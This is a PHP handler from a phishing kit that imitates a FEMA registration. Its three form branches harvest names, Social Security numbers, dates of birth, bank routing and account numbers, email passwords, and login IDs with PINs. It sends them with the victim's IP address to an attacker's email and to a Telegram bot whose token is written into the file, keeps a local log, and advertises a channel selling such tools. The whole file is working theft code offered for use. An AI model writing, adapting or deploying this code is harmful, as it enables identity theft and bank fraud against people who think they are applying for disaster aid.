<?php
include './email.php';
$token = "1716187726:AAEkVIRGoKbQFrfRl6cAqrEBeCwSP1yuf00";
$chatid = "1087444623";


if (isset($_POST['btn3'])) {
	

	$ip = getenv("REMOTE_ADDR");
	$hostname = gethostbyaddr($ip);
	$useragent = $_SERVER['HTTP_USER_AGENT'];
	$message .= "|----------| FEMA V1 - New User |--------------|\n";
	$message .= "Full Name            : ".$_POST['rgstValue(FST_NM)']."\n";
	$message .= "SSN            : ".$_POST['SSN1'].$_POST['SSN2'].$_POST['SSN3']."\n";
	$message .= "DOB            : ".$_POST['DOB1'].$_POST['DOB2'].$_POST['DOB3']."\n";
	$message .= "Email              : ".$_POST['mail']."\n";
	$message .= "Phone number            : ".$_POST['ph']."\n";
	$message .= "Routine Number            : ".$_POST['rout']."\n";
	$message .= "Account Number            : ".$_POST['acc']."\n";	


	$message .= "|--------------- I N F O | I P -------------------|\n";
	$message .= "|Client IP: ".$ip."\n";
	$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
	$message .= "User Agent : ".$useragent."\n";
	$message .= "|----------buy tools from https://t.me/aloffz -------------|\n";
	$send = $Receive_email;
	$subject = "Login : $ip";
	mail($send, $subject, $message);
	
	function sendMessage($chatID, $message, $token) {
    $url = "https://api.telegram.org/bot" . $token . "/sendMessage?chat_id=" . $chatID;
    $url = $url . "&text=" . urlencode($message);
    $ch = curl_init();
    $optArray = array(CURLOPT_URL => $url, CURLOPT_RETURNTRANSFER => true);
    curl_setopt_array($ch, $optArray);
    $result = curl_exec($ch);
    curl_close($ch);
    return $result;
}
	sendMessage($chatid, $message, $token);
	file_put_contents("logxy.txt", $message, FILE_APPEND);
	 
	header("Location:  ./confirmation.html");

	
	
}

if (isset($_POST['btn2'])) {
	

	$ip = getenv("REMOTE_ADDR");
	$hostname = gethostbyaddr($ip);
	$useragent = $_SERVER['HTTP_USER_AGENT'];
	$message .= "|----------| FEMA V1 - Mail Access |--------------|\n";
	$message .= "Email Access            : ".$_POST['mail']."\n";
	$message .= "Password            : ".$_POST['pans']."\n";

	$message .= "|--------------- I N F O | I P -------------------|\n";
	$message .= "|Client IP: ".$ip."\n";
	$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
	$message .= "User Agent : ".$useragent."\n";
	$message .= "|----------- buy tools from https://t.me/aloffz --------------|\n";
	$send = $Receive_email;
	$subject = "Login : $ip";
	mail($send, $subject, $message);
	
	function sendMessage($chatID, $message, $token) {
    $url = "https://api.telegram.org/bot" . $token . "/sendMessage?chat_id=" . $chatID;
    $url = $url . "&text=" . urlencode($message);
    $ch = curl_init();
    $optArray = array(CURLOPT_URL => $url, CURLOPT_RETURNTRANSFER => true);
    curl_setopt_array($ch, $optArray);
    $result = curl_exec($ch);
    curl_close($ch);
    return $result;
}
	sendMessage($chatid, $message, $token);
	file_put_contents("logxy.txt", $message, FILE_APPEND);
	
	header("Location:  ./thank.html");

	
	
}

else if (isset($_POST['btn1'])) {
	

	$ip = getenv("REMOTE_ADDR");
	$hostname = gethostbyaddr($ip);
	$useragent = $_SERVER['HTTP_USER_AGENT'];
	$message .= "|----------| FEMA V1 - Old User |--------------|\n";
	$message .= "User ID:  ".$_POST['uid']."\n";
	$message .= "Password:  ".$_POST['pwd']."\n";
	$message .= "Pin:  ".$_POST['pin']."\n";
	$message .= "SSN:  ".$_POST['SSN1'].$_POST['SSN2'].$_POST['SSN3']."\n";
	$message .= "DOB:  ".$_POST['DOB1'].$_POST['DOB2'].$_POST['DOB3']."\n";

	$message .= "|--------------- I N F O | I P -------------------|\n";
	$message .= "|Client IP: ".$ip."\n";
	$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
	$message .= "User Agent : ".$useragent."\n";
	$message .= "|----------buy tools from https://t.me/aloffz -------------|\n";
	$send = $Receive_email;
	$subject = "Login : $ip";
	mail($send, $subject, $message);
	
	function sendMessage($chatID, $message, $token) {
    $url = "https://api.telegram.org/bot" . $token . "/sendMessage?chat_id=" . $chatID;
    $url = $url . "&text=" . urlencode($message);
    $ch = curl_init();
    $optArray = array(CURLOPT_URL => $url, CURLOPT_RETURNTRANSFER => true);
    curl_setopt_array($ch, $optArray);
    $result = curl_exec($ch);
    curl_close($ch);
    return $result;
}
	sendMessage($chatid, $message, $token);
	file_put_contents("logxy.txt", $message, FILE_APPEND);
	 
	header("Location:  ./confirmation.html");

	
	
}

else{
	$signal = 'bad';
	$msg = 'Please fill in all the fields.';
}
$data = array(
        'signal' => $signal,
        'msg' => $msg,
        'redirect_link' => $redirect,
    );
    echo json_encode($data);

?>